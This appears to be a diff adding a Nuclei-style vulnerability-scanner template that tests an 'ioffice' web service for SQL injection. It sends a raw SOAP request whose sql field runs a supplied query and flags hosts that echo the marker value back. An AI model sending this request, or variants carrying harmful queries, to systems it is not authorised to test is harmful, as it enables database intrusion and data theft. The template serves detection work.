@@ -1,0 +1,33 @@
+id: ioffice-isassistance2-sqli
+
+info:
+  name: ioffice-isassistance2-sqli
+  author: HB
+  severity: critical
+
+
+http:
+  - raw:
+    - |
+      POST /ioffice/prg/set/wss/ioAssistance2.asmx HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+      Connection: close
+      Content-Length: 373
+      Content-Type: text/xml; charset=utf-8
+      Soapaction: "http://tempuri.org/GetLoginedEmpNoReadedInf"
+      Accept-Encoding: gzip, deflate
+
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+      <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+      <sql>select 1111123</sql>
+      </GetLoginedEmpNoReadedInf>
+      </soap:Body>
+      </soap:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"1111123")'
